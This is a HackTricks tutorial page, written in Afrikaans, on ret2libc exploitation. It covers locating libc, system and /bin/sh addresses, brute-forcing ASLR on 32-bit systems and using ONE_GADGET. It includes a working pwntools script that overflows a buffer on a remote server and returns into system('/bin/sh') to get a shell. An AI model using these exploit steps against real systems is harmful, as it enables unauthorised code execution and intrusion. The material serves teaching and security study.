# Ret2lib

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## **Basiese Inligting**

Die essensie van **Ret2Libc** is om die uitvoervloei van 'n kwesbare program om te lei na 'n funksie binne 'n gedeelde biblioteek (bv. **system**, **execve**, **strcpy**) in plaas van die uitvoering van aanvaller-voorsiene shellkode op die stapel. Die aanvaller stel 'n lading op wat die terugkeeradres op die stapel wysig om na die gewenste biblioteekfunksie te wys, terwyl hy ook re√´l vir enige nodige argumente om korrek opgestel te word volgens die oproepkonvensie.

### **Voorbeeldstappe (vereenvoudig)**

* Kry die adres van die funksie om te roep (bv. system) en die bevel om te roep (bv. /bin/sh)
* Genereer 'n ROP-ketting om die eerste argument wat na die bevelstring wys en die uitvoervloei na die funksie te stuur

## Vind die adresse

* Veronderstel dat die `libc` wat gebruik word die een van die huidige masjien is, kan jy vind waar dit in die geheue gelaai sal word met:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

As jy wil nagaan of die ASLR die adres van libc verander, kan jy dit doen:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Met die kennis van die gebruikte libc is dit ook moontlik om die verskuiwing na die `system`-funksie te vind met:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* As jy die libc wat gebruik word ken, is dit ook moontlik om die offset na die string `/bin/sh` funksie te vind met:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Gebruik van gdb-peda / GEF

Met kennis van die gebruikte libc, is dit ook moontlik om Peda of GEF te gebruik om die adres van die **system**-funksie, die **exit**-funksie en die string **`/bin/sh`** te kry:
```
p system
p exit
find "/bin/sh"
```
### Gebruik /proc/\<PID>/maps

Indien die proses elke keer as jy met dit praat **kinders skep** (netwerk bediener), probeer om daardie l√™er te **lees** (jy sal waarskynlik root toegang benodig).

Hier kan jy **presies vind waar die libc gelaai is** binne die proses en **waar dit gelaai gaan word** vir elke kind van die proses.

![](<../../../../.gitbook/assets/image (95).png>)

In hierdie geval is dit gelaai by **0xb75dc000** (Dit sal die basis adres van libc wees)

## Onbekende libc

Dit mag moontlik wees dat jy **nie weet watter libc die bin√™re l√™ nie** (omdat dit dalk op 'n bediener is waar jy geen toegang tot het nie). In daardie geval kan jy die kwesbaarheid misbruik om **sekere adresse te lek en te vind watter libc** biblioteek gebruik word:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

En jy kan 'n pwntools templaat hiervoor vind in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## ASLR omseil in 32 bits

Hierdie brute-krag aanvalle is **slegs nuttig vir 32bit stelsels**.

* Indien die aanval plaaslik is, kan jy probeer om die basis adres van libc met brute krag te agterhaal (nuttig vir 32bit stelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Indien jy 'n afgele√´ bediener aanval, kan jy probeer om die adres van die `libc`-funksie `usleep` met 'n argument van 10 (byvoorbeeld) te **burte-force**. As die bediener op 'n stadium 10 sekondes langer neem om te reageer, het jy die adres van hierdie funksie gevind.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget) maak dit moontlik om 'n skaal te verkry in plaas van die gebruik van **system** en **"/bin/sh"**. **ONE\_GADGET** sal binne die `libc`-biblioteek 'n manier vind om 'n skaal te verkry deur net een **ROP-adres** te gebruik.\
Gewoonlik is daar egter sekere beperkings, die mees algemene en maklikste om te vermy is soos `[rsp+0x30] == NULL`. Aangesien jy die waardes binne die **RSP** beheer, hoef jy net nog 'n paar NULL-waardes te stuur sodat die beperking vermy word.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## x86 Ret2lib Kodevoorbeeld

In hierdie voorbeeld is ASLR-brute force ge√Øntegreer in die kode en die kwesbare bin√™re l√™er is op 'n afgele√´ bediener gele√´:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kodevoorbeeld

Kyk na die voorbeeld van:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-in-printf (of puts)

Dit maak dit moontlik om **inligting uit die proses te lek** deur `printf`/`puts` te roep met spesifieke data geplaas as 'n argument.

## Ret2printf

Dit beteken basies die misbruik van 'n **Ret2lib om dit te omskep in 'n `printf` formaat strings kwesbaarheid** deur die `ret2lib` te gebruik om printf te roep met die waardes om dit te benut (klink nutteloos maar moontlik):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
